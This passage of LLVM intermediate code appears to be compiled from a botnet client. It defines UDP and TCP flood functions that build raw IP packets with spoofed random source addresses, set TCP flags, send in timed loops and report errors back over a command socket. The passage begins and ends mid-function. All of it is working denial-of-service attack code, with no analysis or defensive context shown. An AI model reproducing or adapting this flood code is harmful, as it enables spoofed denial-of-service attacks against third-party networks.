  %66 = call i32 @connect(i32 %64, %struct.sockaddr* %65, i32 16)
  %67 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %68 = sext i32 %67 to i64
  %69 = load i64, i64* %9, align 8
  %70 = load i32, i32* %6, align 4
  %71 = sext i32 %70 to i64
  %72 = add nsw i64 %69, %71
  %73 = icmp sge i64 %68, %72
  br i1 %73, label %74, label %77

; <label>:74:                                     ; preds = %58
  %75 = load i32, i32* %7, align 4
  %76 = call i32 @close(i32 %75)
  call void @_exit(i32 0) #12
  unreachable

; <label>:77:                                     ; preds = %58
  store i32 0, i32* %12, align 4
  br label %78

; <label>:78:                                     ; preds = %77, %49
  %79 = load i32, i32* %12, align 4
  %80 = add i32 %79, 1
  store i32 %80, i32* %12, align 4
  br label %49
}

; Function Attrs: nounwind
declare i32 @rand() #4

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32, i32, i32) #0 {
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca %struct.sockaddr_in, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.udphdr*, align 8
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  store i8* %0, i8** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 %7, i32* %16, align 4
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 0
  store i16 2, i16* %34, align 4
  %35 = load i32, i32* %10, align 4
  %36 = icmp eq i32 %35, 0
  br i1 %36, label %37, label %41

; <label>:37:                                     ; preds = %8
  %38 = call i32 @rand_cmwc()
  %39 = trunc i32 %38 to i16
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %39, i16* %40, align 2
  br label %46

; <label>:41:                                     ; preds = %8
  %42 = load i32, i32* %10, align 4
  %43 = trunc i32 %42 to i16
  %44 = call zeroext i16 @htons(i16 zeroext %43) #13
  %45 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %44, i16* %45, align 2
  br label %46

; <label>:46:                                     ; preds = %41, %37
  %47 = load i8*, i8** %9, align 8
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %49 = call i32 @getHost(i8* %47, %struct.in_addr* %48)
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %51, label %52

; <label>:51:                                     ; preds = %46
  br label %295

; <label>:52:                                     ; preds = %46
  %53 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 3
  %54 = getelementptr inbounds [8 x i8], [8 x i8]* %53, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %54, i8 0, i64 8, i32 4, i1 false)
  %55 = load i32, i32* %14, align 4
  store i32 %55, i32* %18, align 4
  %56 = load i32, i32* %12, align 4
  %57 = icmp eq i32 %56, 32
  br i1 %57, label %58, label %120

; <label>:58:                                     ; preds = %52
  %59 = call i32 @socket(i32 2, i32 2, i32 17) #2
  store i32 %59, i32* %19, align 4
  %60 = load i32, i32* %19, align 4
  %61 = icmp ne i32 %60, 0
  br i1 %61, label %65, label %62

; <label>:62:                                     ; preds = %58
  %63 = load i32, i32* @mainCommSock, align 4
  %64 = call i32 (i32, i8*, ...) @sockprintf(i32 %63, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.73, i32 0, i32 0))
  br label %295

; <label>:65:                                     ; preds = %58
  %66 = load i32, i32* %13, align 4
  %67 = add nsw i32 %66, 1
  %68 = sext i32 %67 to i64
  %69 = call noalias i8* @malloc(i64 %68) #2
  store i8* %69, i8** %20, align 8
  %70 = load i8*, i8** %20, align 8
  %71 = icmp eq i8* %70, null
  br i1 %71, label %72, label %73

; <label>:72:                                     ; preds = %65
  br label %295

; <label>:73:                                     ; preds = %65
  %74 = load i8*, i8** %20, align 8
  %75 = load i32, i32* %13, align 4
  %76 = add nsw i32 %75, 1
  %77 = sext i32 %76 to i64
  call void @llvm.memset.p0i8.i64(i8* %74, i8 0, i64 %77, i32 1, i1 false)
  %78 = load i8*, i8** %20, align 8
  %79 = load i32, i32* %13, align 4
  call void @makeRandomStr(i8* %78, i32 %79)
  %80 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %81 = load i32, i32* %11, align 4
  %82 = add nsw i32 %80, %81
  store i32 %82, i32* %21, align 4
  store i32 0, i32* %22, align 4
  store i32 0, i32* %23, align 4
  br label %83

; <label>:83:                                     ; preds = %116, %112, %105, %73
  %84 = load i32, i32* %19, align 4
  %85 = load i8*, i8** %20, align 8
  %86 = load i32, i32* %13, align 4
  %87 = sext i32 %86 to i64
  %88 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %89 = call i64 @sendto(i32 %84, i8* %85, i64 %87, i32 0, %struct.sockaddr* %88, i32 16)
  %90 = load i32, i32* %22, align 4
  %91 = load i32, i32* %18, align 4
  %92 = icmp eq i32 %90, %91
  br i1 %92, label %93, label %106

; <label>:93:                                     ; preds = %83
  %94 = load i32, i32* %10, align 4
  %95 = icmp eq i32 %94, 0
  br i1 %95, label %96, label %100

; <label>:96:                                     ; preds = %93
  %97 = call i32 @rand_cmwc()
  %98 = trunc i32 %97 to i16
  %99 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %98, i16* %99, align 2
  br label %100

; <label>:100:                                    ; preds = %96, %93
  %101 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %102 = load i32, i32* %21, align 4
  %103 = icmp sgt i32 %101, %102
  br i1 %103, label %104, label %105

; <label>:104:                                    ; preds = %100
  br label %119

; <label>:105:                                    ; preds = %100
  store i32 0, i32* %22, align 4
  br label %83

; <label>:106:                                    ; preds = %83
  %107 = load i32, i32* %22, align 4
  %108 = add i32 %107, 1
  store i32 %108, i32* %22, align 4
  %109 = load i32, i32* %23, align 4
  %110 = load i32, i32* %15, align 4
  %111 = icmp eq i32 %109, %110
  br i1 %111, label %112, label %116

; <label>:112:                                    ; preds = %106
  %113 = load i32, i32* %16, align 4
  %114 = mul nsw i32 %113, 1000
  %115 = call i32 @usleep(i32 %114)
  store i32 0, i32* %23, align 4
  br label %83

; <label>:116:                                    ; preds = %106
  %117 = load i32, i32* %23, align 4
  %118 = add i32 %117, 1
  store i32 %118, i32* %23, align 4
  br label %83

; <label>:119:                                    ; preds = %104
  br label %295

; <label>:120:                                    ; preds = %52
  %121 = call i32 @socket(i32 2, i32 3, i32 17) #2
  store i32 %121, i32* %24, align 4
  %122 = load i32, i32* %24, align 4
  %123 = icmp ne i32 %122, 0
  br i1 %123, label %127, label %124

; <label>:124:                                    ; preds = %120
  %125 = load i32, i32* @mainCommSock, align 4
  %126 = call i32 (i32, i8*, ...) @sockprintf(i32 %125, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.73, i32 0, i32 0))
  br label %295

; <label>:127:                                    ; preds = %120
  store i32 1, i32* %25, align 4
  %128 = load i32, i32* %24, align 4
  %129 = bitcast i32* %25 to i8*
  %130 = call i32 @setsockopt(i32 %128, i32 0, i32 3, i8* %129, i32 4) #2
  %131 = icmp slt i32 %130, 0
  br i1 %131, label %132, label %135

; <label>:132:                                    ; preds = %127
  %133 = load i32, i32* @mainCommSock, align 4
  %134 = call i32 (i32, i8*, ...) @sockprintf(i32 %133, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.74, i32 0, i32 0))
  br label %295

; <label>:135:                                    ; preds = %127
  store i32 50, i32* %26, align 4
  br label %136

; <label>:136:                                    ; preds = %140, %135
  %137 = load i32, i32* %26, align 4
  %138 = add nsw i32 %137, -1
  store i32 %138, i32* %26, align 4
  %139 = icmp ne i32 %137, 0
  br i1 %139, label %140, label %145

; <label>:140:                                    ; preds = %136
  %141 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %142 = call i32 @rand_cmwc()
  %143 = xor i32 %141, %142
  call void @srand(i32 %143) #2
  %144 = call i32 @rand() #2
  call void @init_rand(i32 %144)
  br label %136

; <label>:145:                                    ; preds = %136
  %146 = load i32, i32* %12, align 4
  %147 = icmp eq i32 %146, 0
  br i1 %147, label %148, label %149

; <label>:148:                                    ; preds = %145
  store i32 0, i32* %27, align 4
  br label %155

; <label>:149:                                    ; preds = %145
  %150 = load i32, i32* %12, align 4
  %151 = sub nsw i32 32, %150
  %152 = shl i32 1, %151
  %153 = sub nsw i32 %152, 1
  %154 = xor i32 %153, -1
  store i32 %154, i32* %27, align 4
  br label %155

; <label>:155:                                    ; preds = %149, %148
  %156 = load i32, i32* %13, align 4
  %157 = sext i32 %156 to i64
  %158 = add i64 28, %157
  %159 = call i8* @llvm.stacksave()
  store i8* %159, i8** %28, align 8
  %160 = alloca i8, i64 %158, align 16
  %161 = bitcast i8* %160 to %struct.iphdr*
  store %struct.iphdr* %161, %struct.iphdr** %29, align 8
  %162 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %163 = bitcast %struct.iphdr* %162 to i8*
  %164 = getelementptr i8, i8* %163, i64 20
  %165 = bitcast i8* %164 to %struct.udphdr*
  store %struct.udphdr* %165, %struct.udphdr** %30, align 8
  %166 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %167 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %168 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %167, i32 0, i32 0
  %169 = load i32, i32* %168, align 4
  %170 = load i32, i32* %27, align 4
  %171 = call i32 @GetRandomIP(i32 %170)
  %172 = call i32 @htonl(i32 %171) #13
  %173 = load i32, i32* %13, align 4
  %174 = sext i32 %173 to i64
  %175 = add i64 8, %174
  %176 = trunc i64 %175 to i32
  call void @makeIPPacket(%struct.iphdr* %166, i32 %169, i32 %172, i8 zeroext 17, i32 %176)
  %177 = load i32, i32* %13, align 4
  %178 = sext i32 %177 to i64
  %179 = add i64 8, %178
  %180 = trunc i64 %179 to i16
  %181 = call zeroext i16 @htons(i16 zeroext %180) #13
  %182 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %183 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %182, i32 0, i32 0
  %184 = bitcast %union.anon.3* %183 to %struct.anon.4*
  %185 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %184, i32 0, i32 2
  store i16 %181, i16* %185, align 2
  %186 = call i32 @rand_cmwc()
  %187 = trunc i32 %186 to i16
  %188 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %189 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %188, i32 0, i32 0
  %190 = bitcast %union.anon.3* %189 to %struct.anon.4*
  %191 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %190, i32 0, i32 0
  store i16 %187, i16* %191, align 2
  %192 = load i32, i32* %10, align 4
  %193 = icmp eq i32 %192, 0
  br i1 %193, label %194, label %196

; <label>:194:                                    ; preds = %155
  %195 = call i32 @rand_cmwc()
  br label %201

; <label>:196:                                    ; preds = %155
  %197 = load i32, i32* %10, align 4
  %198 = trunc i32 %197 to i16
  %199 = call zeroext i16 @htons(i16 zeroext %198) #13
  %200 = zext i16 %199 to i32
  br label %201

; <label>:201:                                    ; preds = %196, %194
  %202 = phi i32 [ %195, %194 ], [ %200, %196 ]
  %203 = trunc i32 %202 to i16
  %204 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %205 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %204, i32 0, i32 0
  %206 = bitcast %union.anon.3* %205 to %struct.anon.4*
  %207 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %206, i32 0, i32 1
  store i16 %203, i16* %207, align 2
  %208 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %209 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %208, i32 0, i32 0
  %210 = bitcast %union.anon.3* %209 to %struct.anon.4*
  %211 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %210, i32 0, i32 3
  store i16 0, i16* %211, align 2
  %212 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %213 = bitcast %struct.udphdr* %212 to i8*
  %214 = getelementptr inbounds i8, i8* %213, i64 8
  %215 = load i32, i32* %13, align 4
  call void @makeRandomStr(i8* %214, i32 %215)
  %216 = bitcast i8* %160 to i16*
  %217 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %218 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %217, i32 0, i32 2
  %219 = load i16, i16* %218, align 2
  %220 = zext i16 %219 to i32
  %221 = call zeroext i16 @csum(i16* %216, i32 %220)
  %222 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %223 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %222, i32 0, i32 7
  store i16 %221, i16* %223, align 2
  %224 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %225 = load i32, i32* %11, align 4
  %226 = add nsw i32 %224, %225
  store i32 %226, i32* %31, align 4
  store i32 0, i32* %32, align 4
  store i32 0, i32* %33, align 4
  br label %227

; <label>:227:                                    ; preds = %290, %286, %279, %201
  br label %228

; <label>:228:                                    ; preds = %227
  %229 = load i32, i32* %24, align 4
  %230 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %231 = call i64 @sendto(i32 %229, i8* %160, i64 %158, i32 0, %struct.sockaddr* %230, i32 16)
  %232 = call i32 @rand_cmwc()
  %233 = trunc i32 %232 to i16
  %234 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %235 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %234, i32 0, i32 0
  %236 = bitcast %union.anon.3* %235 to %struct.anon.4*
  %237 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %236, i32 0, i32 0
  store i16 %233, i16* %237, align 2
  %238 = load i32, i32* %10, align 4
  %239 = icmp eq i32 %238, 0
  br i1 %239, label %240, label %242

; <label>:240:                                    ; preds = %228
  %241 = call i32 @rand_cmwc()
  br label %247

; <label>:242:                                    ; preds = %228
  %243 = load i32, i32* %10, align 4
  %244 = trunc i32 %243 to i16
  %245 = call zeroext i16 @htons(i16 zeroext %244) #13
  %246 = zext i16 %245 to i32
  br label %247

; <label>:247:                                    ; preds = %242, %240
  %248 = phi i32 [ %241, %240 ], [ %246, %242 ]
  %249 = trunc i32 %248 to i16
  %250 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %251 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %250, i32 0, i32 0
  %252 = bitcast %union.anon.3* %251 to %struct.anon.4*
  %253 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %252, i32 0, i32 1
  store i16 %249, i16* %253, align 2
  %254 = call i32 @rand_cmwc()
  %255 = trunc i32 %254 to i16
  %256 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %257 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %256, i32 0, i32 3
  store i16 %255, i16* %257, align 4
  %258 = load i32, i32* %27, align 4
  %259 = call i32 @GetRandomIP(i32 %258)
  %260 = call i32 @htonl(i32 %259) #13
  %261 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %262 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %261, i32 0, i32 8
  store i32 %260, i32* %262, align 4
  %263 = bitcast i8* %160 to i16*
  %264 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %265 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %264, i32 0, i32 2
  %266 = load i16, i16* %265, align 2
  %267 = zext i16 %266 to i32
  %268 = call zeroext i16 @csum(i16* %263, i32 %267)
  %269 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %270 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %269, i32 0, i32 7
  store i16 %268, i16* %270, align 2
  %271 = load i32, i32* %32, align 4
  %272 = load i32, i32* %18, align 4
  %273 = icmp eq i32 %271, %272
  br i1 %273, label %274, label %280

; <label>:274:                                    ; preds = %247
  %275 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %276 = load i32, i32* %31, align 4
  %277 = icmp sgt i32 %275, %276
  br i1 %277, label %278, label %279

; <label>:278:                                    ; preds = %274
  br label %293

; <label>:279:                                    ; preds = %274
  store i32 0, i32* %32, align 4
  br label %227

; <label>:280:                                    ; preds = %247
  %281 = load i32, i32* %32, align 4
  %282 = add i32 %281, 1
  store i32 %282, i32* %32, align 4
  %283 = load i32, i32* %33, align 4
  %284 = load i32, i32* %15, align 4
  %285 = icmp eq i32 %283, %284
  br i1 %285, label %286, label %290

; <label>:286:                                    ; preds = %280
  %287 = load i32, i32* %16, align 4
  %288 = mul nsw i32 %287, 1000
  %289 = call i32 @usleep(i32 %288)
  store i32 0, i32* %33, align 4
  br label %227

; <label>:290:                                    ; preds = %280
  %291 = load i32, i32* %33, align 4
  %292 = add i32 %291, 1
  store i32 %292, i32* %33, align 4
  br label %227

; <label>:293:                                    ; preds = %278
  %294 = load i8*, i8** %28, align 8
  call void @llvm.stackrestore(i8* %294)
  br label %295

; <label>:295:                                    ; preds = %293, %132, %124, %119, %72, %62, %51
  ret void
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

declare i32 @usleep(i32) #3

; Function Attrs: nounwind
declare void @srand(i32) #4

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #8

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i32 %3, i32* %11, align 4
  store i8* %4, i8** %12, align 8
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %14, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %34

; <label>:30:                                     ; preds = %7
  %31 = call i32 @rand_cmwc()
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %32, i16* %33, align 2
  br label %39

; <label>:34:                                     ; preds = %7
  %35 = load i32, i32* %9, align 4
  %36 = trunc i32 %35 to i16
  %37 = call zeroext i16 @htons(i16 zeroext %36) #13
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  br label %39

; <label>:39:                                     ; preds = %34, %30
  %40 = load i8*, i8** %8, align 8
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %42 = call i32 @getHost(i8* %40, %struct.in_addr* %41)
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %44, label %45

; <label>:44:                                     ; preds = %39
  br label %339

; <label>:45:                                     ; preds = %39
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %47 = getelementptr inbounds [8 x i8], [8 x i8]* %46, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 8, i32 4, i1 false)
  %48 = call i32 @socket(i32 2, i32 3, i32 6) #2
  store i32 %48, i32* %17, align 4
  %49 = load i32, i32* %17, align 4
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %54, label %51

; <label>:51:                                     ; preds = %45
  %52 = load i32, i32* @mainCommSock, align 4
  %53 = call i32 (i32, i8*, ...) @sockprintf(i32 %52, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.73, i32 0, i32 0))
  br label %339

; <label>:54:                                     ; preds = %45
  store i32 1, i32* %18, align 4
  %55 = load i32, i32* %17, align 4
  %56 = bitcast i32* %18 to i8*
  %57 = call i32 @setsockopt(i32 %55, i32 0, i32 3, i8* %56, i32 4) #2
  %58 = icmp slt i32 %57, 0
  br i1 %58, label %59, label %62

; <label>:59:                                     ; preds = %54
  %60 = load i32, i32* @mainCommSock, align 4
  %61 = call i32 (i32, i8*, ...) @sockprintf(i32 %60, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.74, i32 0, i32 0))
  br label %339

; <label>:62:                                     ; preds = %54
  %63 = load i32, i32* %11, align 4
  %64 = icmp eq i32 %63, 0
  br i1 %64, label %65, label %66

; <label>:65:                                     ; preds = %62
  store i32 0, i32* %19, align 4
  br label %72

; <label>:66:                                     ; preds = %62
  %67 = load i32, i32* %11, align 4
  %68 = sub nsw i32 32, %67
  %69 = shl i32 1, %68
  %70 = sub nsw i32 %69, 1
  %71 = xor i32 %70, -1
  store i32 %71, i32* %19, align 4
  br label %72

; <label>:72:                                     ; preds = %66, %65
  %73 = load i32, i32* %13, align 4
  %74 = sext i32 %73 to i64
  %75 = add i64 40, %74
  %76 = call i8* @llvm.stacksave()
  store i8* %76, i8** %20, align 8
  %77 = alloca i8, i64 %75, align 16
  %78 = bitcast i8* %77 to %struct.iphdr*
  store %struct.iphdr* %78, %struct.iphdr** %21, align 8
  %79 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %80 = bitcast %struct.iphdr* %79 to i8*
  %81 = getelementptr i8, i8* %80, i64 20
  %82 = bitcast i8* %81 to %struct.tcphdr*
  store %struct.tcphdr* %82, %struct.tcphdr** %22, align 8
  %83 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %84 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %85 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %84, i32 0, i32 0
  %86 = load i32, i32* %85, align 4
  %87 = load i32, i32* %19, align 4
  %88 = call i32 @GetRandomIP(i32 %87)
  %89 = call i32 @htonl(i32 %88) #13
  %90 = load i32, i32* %13, align 4
  %91 = sext i32 %90 to i64
  %92 = add i64 20, %91
  %93 = trunc i64 %92 to i32
  call void @makeIPPacket(%struct.iphdr* %83, i32 %86, i32 %89, i8 zeroext 6, i32 %93)
  %94 = call i32 @rand_cmwc()
  %95 = trunc i32 %94 to i16
  %96 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %97 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %96, i32 0, i32 0
  %98 = bitcast %union.anon.0* %97 to %struct.anon.1*
  %99 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %98, i32 0, i32 0
  store i16 %95, i16* %99, align 4
  %100 = call i32 @rand_cmwc()
  %101 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %102 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %101, i32 0, i32 0
  %103 = bitcast %union.anon.0* %102 to %struct.anon.1*
  %104 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %103, i32 0, i32 2
  store i32 %100, i32* %104, align 4
  %105 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %106 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %105, i32 0, i32 0
  %107 = bitcast %union.anon.0* %106 to %struct.anon.1*
  %108 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %107, i32 0, i32 3
  store i32 0, i32* %108, align 4
  %109 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %110 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %109, i32 0, i32 0
  %111 = bitcast %union.anon.0* %110 to %struct.anon.1*
  %112 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %111, i32 0, i32 4
  %113 = load i16, i16* %112, align 4
  %114 = and i16 %113, -241
  %115 = or i16 %114, 80
  store i16 %115, i16* %112, align 4
  %116 = load i8*, i8** %12, align 8
  %117 = call i32 @strcmp(i8* %116, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.75, i32 0, i32 0)) #10
  %118 = icmp ne i32 %117, 0
  br i1 %118, label %155, label %119

; <label>:119:                                    ; preds = %72
  %120 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %121 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %120, i32 0, i32 0
  %122 = bitcast %union.anon.0* %121 to %struct.anon.1*
  %123 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %122, i32 0, i32 4
  %124 = load i16, i16* %123, align 4
  %125 = and i16 %124, -513
  %126 = or i16 %125, 512
  store i16 %126, i16* %123, align 4
  %127 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %128 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %127, i32 0, i32 0
  %129 = bitcast %union.anon.0* %128 to %struct.anon.1*
  %130 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %129, i32 0, i32 4
  %131 = load i16, i16* %130, align 4
  %132 = and i16 %131, -1025
  %133 = or i16 %132, 1024
  store i16 %133, i16* %130, align 4
  %134 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %135 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %134, i32 0, i32 0
  %136 = bitcast %union.anon.0* %135 to %struct.anon.1*
  %137 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %136, i32 0, i32 4
  %138 = load i16, i16* %137, align 4
  %139 = and i16 %138, -257
  %140 = or i16 %139, 256
  store i16 %140, i16* %137, align 4
  %141 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %142 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %141, i32 0, i32 0
  %143 = bitcast %union.anon.0* %142 to %struct.anon.1*
  %144 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %143, i32 0, i32 4
  %145 = load i16, i16* %144, align 4
  %146 = and i16 %145, -4097
  %147 = or i16 %146, 4096
  store i16 %147, i16* %144, align 4
  %148 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %149 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %148, i32 0, i32 0
  %150 = bitcast %union.anon.0* %149 to %struct.anon.1*
  %151 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %150, i32 0, i32 4
  %152 = load i16, i16* %151, align 4
  %153 = and i16 %152, -2049
  %154 = or i16 %153, 2048
  store i16 %154, i16* %151, align 4
  br label %232

; <label>:155:                                    ; preds = %72
  %156 = load i8*, i8** %12, align 8
  %157 = call i8* @strtok(i8* %156, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %157, i8** %23, align 8
  br label %158

; <label>:158:                                    ; preds = %229, %155
  %159 = load i8*, i8** %23, align 8
  %160 = icmp ne i8* %159, null
  br i1 %160, label %161, label %231

; <label>:161:                                    ; preds = %158
  %162 = load i8*, i8** %23, align 8
  %163 = call i32 @strcmp(i8* %162, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.77, i32 0, i32 0)) #10
  %164 = icmp ne i32 %163, 0
  br i1 %164, label %173, label %165

; <label>:165:                                    ; preds = %161
  %166 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %167 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %166, i32 0, i32 0
  %168 = bitcast %union.anon.0* %167 to %struct.anon.1*
  %169 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %168, i32 0, i32 4
  %170 = load i16, i16* %169, align 4
  %171 = and i16 %170, -513
  %172 = or i16 %171, 512
  store i16 %172, i16* %169, align 4
  br label %229

; <label>:173:                                    ; preds = %161
  %174 = load i8*, i8** %23, align 8
  %175 = call i32 @strcmp(i8* %174, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.78, i32 0, i32 0)) #10
  %176 = icmp ne i32 %175, 0
  br i1 %176, label %185, label %177

; <label>:177:                                    ; preds = %173
  %178 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %179 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %178, i32 0, i32 0
  %180 = bitcast %union.anon.0* %179 to %struct.anon.1*
  %181 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %180, i32 0, i32 4
  %182 = load i16, i16* %181, align 4
  %183 = and i16 %182, -1025
  %184 = or i16 %183, 1024
  store i16 %184, i16* %181, align 4
  br label %228

; <label>:185:                                    ; preds = %173
